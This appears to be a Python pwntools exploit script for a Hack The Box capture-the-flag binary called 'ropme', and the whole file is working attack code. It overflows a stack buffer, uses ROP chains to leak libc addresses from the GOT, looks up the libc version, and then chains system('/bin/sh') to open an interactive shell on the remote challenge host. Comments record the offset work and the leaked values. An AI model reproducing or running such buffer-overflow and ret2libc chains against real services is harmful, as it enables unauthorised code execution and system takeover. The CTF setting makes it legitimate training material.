import binascii
from pwn import *
import sys
import time

ELF_FILE = './ropme'
LIBC_DB_EXE = '/opt/libc-database/'

context(os='linux', arch='amd64')


# p = process('./ropme')
# elf = p.elf
def find_libc(remote_addr, remote_port):
    p = remote(remote_addr, remote_port)
    elf = ELF(ELF_FILE)
    junk = "A"*72


    rop = ROP(elf)
    rop.search(regs=['rdi'], order='regs')
    rop.puts(elf.got['fflush'])
    rop.call(elf.symbols['main'])
    payload = junk + str(rop)
    p.recvuntil("ROP me outside, how 'about dah?")
    p.sendline(payload)
    p.recvline()
    leaked_fflush = p.recvline().rstrip().ljust(8, "\x00")


    rop = ROP(elf)
    rop.search(regs=['rdi'], order='regs')
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])
    payload = junk + str(rop)
    p.recvuntil("ROP me outside, how 'about dah?")
    p.sendline(payload)
    p.recvline()
    leaked_puts = p.recvline().rstrip().ljust(8, "\x00")


    rop = ROP(elf)
    rop.search(regs=['rdi'], order='regs')
    rop.puts(elf.got['__libc_start_main'])
    rop.call(elf.symbols['main'])
    payload = junk + str(rop)
    p.recvuntil("ROP me outside, how 'about dah?")
    p.sendline(payload)
    p.recvline()
    leaked_libc_start_main = p.recvline().rstrip().ljust(8, "\x00")


    log.success("{} leaked fflush".format(binascii.hexlify(leaked_fflush)))
    log.success("{} leaked puts".format(binascii.hexlify(leaked_puts)))
    log.success("{} leaked __libc_start_main".format(binascii.hexlify(leaked_libc_start_main)))


    log.info("Trying to find the right libc")

    os.system("{}find fflush {} puts {} __libc_start_main {}".format(LIBC_DB_EXE, binascii.hexlify(leaked_fflush)[:2], binascii.hexlify(leaked_puts)[:2], binascii.hexlify(leaked_libc_start_main)[:2]))



def pop(remote_addr, remote_port, elf_path, libc_path):
    p = remote(remote_addr, remote_port)
    elf = ELF(ELF_FILE)
    libc = ELF(libc_path)
    junk = "A"*72
    # gdb
    #     pattern_create 500
    #     x/xg $rsp
    #     pattern_offset 0x3441416541414941
    #     3765362666600745281 found at offset: 71

    rop = ROP(elf)
    rop.search(regs=['rdi'], order='regs')
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])
    payload = junk + str(rop)
    p.recvuntil("ROP me outside, how 'about dah?")
    p.sendline(payload)
    p.recvline()
    leaked_puts = p.recvline().rstrip().ljust(8, "\x00")
    log.info(leaked_puts)
    leaked_puts = u64(leaked_puts)
    leaked_base_address = leaked_puts - libc.symbols['puts']
    libc.address = leaked_base_address

    time.sleep(2)

    rop2 = ROP(libc)
    # 
    rop2.system(list(libc.search('/bin/sh\x00'))[0]-64)
    log.info("Stage 2 rop chain:\n"+rop2.dump())
    payload = junk + str(rop2)


    p.recvuntil("ROP me outside, how 'about dah?")
    p.sendline(payload)

    p.sendline("ls")
    p.interactive()

if __name__ == '__main__':
    # find_libc()

    # [*] Loaded cached gadgets for './ropme'
    # [+] a0c709e7267f0000 leaked fflush
    # [+] 90e609e7267f0000 leaked puts
    # [+] 40f704e7267f0000 leaked __libc_start_main
    # [*] Trying to find the right libc
    # ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
    # archive-glibc (id libc6_2.23-0ubuntu11_amd64)
    # a = ELF('./ropme')
    # libc=a.libc
    # # libc = ELF('/opt/libc-database/db/libc6_2.23-0ubuntu11_amd64.so')
    # addr = list(libc.search('/bin/sh\x00'))[0]
    # print(p64(int(addr)))

    pop('docker.hackthebox.eu', 35415, './ropme', '/opt/libc-database/db/libc6_2.23-0ubuntu11_amd64.so')
